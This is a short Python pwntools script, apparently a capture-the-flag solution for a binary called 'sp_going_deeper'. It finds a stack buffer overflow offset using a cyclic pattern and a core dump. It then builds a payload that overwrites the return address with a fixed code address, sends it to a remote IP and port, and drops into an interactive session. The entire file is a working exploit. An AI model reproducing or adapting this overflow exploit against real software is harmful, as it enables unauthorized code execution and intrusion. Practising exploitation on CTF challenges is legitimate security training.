from pwn import *
exe = 'sp_going_deeper'
elf = context.binary = ELF(exe, checksec=True)
#context.log_level = 'debug'

def findoffset(path,size):
    target=process(path)
    target.sendlineafter('>>', '1')
    target.sendlineafter(':', cyclic(size))
    target.wait()
    info(cyclic_find(target.corefile.rbp)+8) # x64
    return cyclic_find(target.corefile.rbp)+8

payload = flat(
    {findoffset(exe,300):0x00400b12}
)

io= remote("83.136.254.158",52574)
io.sendlineafter(b">> ", "1")
io.sendlineafter(':', payload)
info(payload)
io.interactive()
